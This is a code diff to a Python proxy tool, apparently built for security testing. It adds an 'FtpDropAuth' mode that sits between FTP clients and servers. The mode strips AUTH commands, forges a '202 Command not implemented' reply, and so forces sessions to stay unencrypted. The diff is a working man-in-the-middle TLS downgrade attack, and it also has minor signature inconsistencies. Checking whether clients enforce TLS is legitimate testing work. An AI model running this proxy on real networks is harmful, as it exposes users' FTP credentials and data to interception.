@@ -26,6 +26,18 @@ class DataDirection(Enum):
     FROM_CLIENT_TO_SERVER = 1
     FROM_SERVER_TO_CLIENT = 2
 
+class HandlerResult:
+
+    def __init__(self, data):
+        self.data = data
+        self.dropped = False
+        self.reply = None
+
+    def data(self):         return self.data
+    def is_dropped(self):   return self.dropped
+    def has_reply(self):    return self.reply != None
+    def drop(self):         self.dropped = True
+
 # base class for data handlers
 class Handler:
 
@@ -35,22 +47,35 @@ class Handler:
 
     # handle data
     def handle(self, data):
-        pass
+        return HandlerResult(data)
 
     # called in the end to let a handler know that we are done
     def finalize(self):
         pass
 
-class FtpDropTls(Handler):
+class FtpDropAuth(Handler):
+
+    def __init__(self):
+        self.detected = False
 
     def supports(self, direction):
         return direction == DataDirection.FROM_CLIENT_TO_SERVER
 
-    def handle(self, data):
-        self.log('data {0}'.format(data))
+    def handle(self, data, direction):
+        result = HandlerResult(data)
+        try:
+            string = data.decode('utf-8')
+        except Exception as err:
+            self.log('could not decode FTP command, skip: {0}'.format(err))
+            return result
+        if 'AUTH' in string:
+            self.log('drop AUTH message, return 202 Command not implemented')
+            result.drop()
+            result.reply = '202 Command not implemented\r\n'.encode('ascii')
+        return result
 
     def log(self, msg):
-        print_with_prefix('FtpDropTls', msg)
+        print_with_prefix('FtpDropAuth', msg)
 
 # gathers data, and stores it to a file when close() method is called
 # it stores data in hex format
@@ -148,8 +173,8 @@ class Task:
         else:
             raise Exception('Could not parse --ratio value, too many colons')
 
-        if self.args['mode'] == 'ftp_drop_tls':
-            self.handlers = [ FtpDropTls() ]
+        if self.args['mode'] == 'ftp_drop_auth':
+            self.handlers = [ FtpDropAuth() ]
             self.server = self.create_server()
         else:
             raise Exception('Unexpected mode {0:s}'.format(self.args['mode']))
@@ -288,10 +313,18 @@ class Server:
 
                 if received:
                     self.log('received {0:d} bytes from client'.format(len(data)))
-                    self.handle_data(data, DataDirection.FROM_CLIENT_TO_SERVER)
-                    self.log('send data to server')
-                    remote.sendall(data)
-                    self.log('sent {0:d} bytes to server'.format(len(data)))
+                    result = self.handle_data(data, DataDirection.FROM_CLIENT_TO_SERVER)
+                    if result.is_dropped():
+                        self.log('original data from client dropped')
+                        if result.has_reply():
+                            self.log('send modified reply back to client')
+                            conn.sendall(result.reply)
+                            self.log('sent {0:d} bytes to client'.format(len(result.reply)))
+                            continue
+                    else:
+                        self.log('send data to server')
+                        remote.sendall(data)
+                        self.log('sent {0:d} bytes to server'.format(len(data)))
 
                 self.log('receive data from server')
                 received = False
@@ -307,16 +340,28 @@ class Server:
 
                 if received:
                     self.log('received {0:d} bytes from server'.format(len(data)))
-                    self.handle_data(data, DataDirection.FROM_SERVER_TO_CLIENT)
-                    self.log('send data to client')
-                    conn.sendall(data)
-                    self.log('sent {0:d} bytes to client'.format(len(data)))
+                    result = self.handle_data(data, DataDirection.FROM_SERVER_TO_CLIENT)
+                    if result.is_dropped():
+                        self.log('original data from server dropped')
+                        if result.has_reply():
+                            self.log('send modified data to client')
+                            conn.sendall(result.reply)
+                            self.log('sent {0:d} bytes to client'.format(len(result.reply)))
+                            continue
+                    else:
+                        self.log('send data to client')
+                        conn.sendall(data)
+                        self.log('sent {0:d} bytes to client'.format(len(data)))
 
         self.log('connection closed')
 
     def handle_data(self, data, direction):
+        result = HandlerResult(data)
         for handler in self.handlers:
-            if handler.supports(direction): handler.handle(data)
+            if handler.supports(direction):
+                result = handler.handle(data, direction)
+                if result.is_dropped(): return result
+        return result
 
     def log(self, msg):
         print_with_prefix('Server', msg)
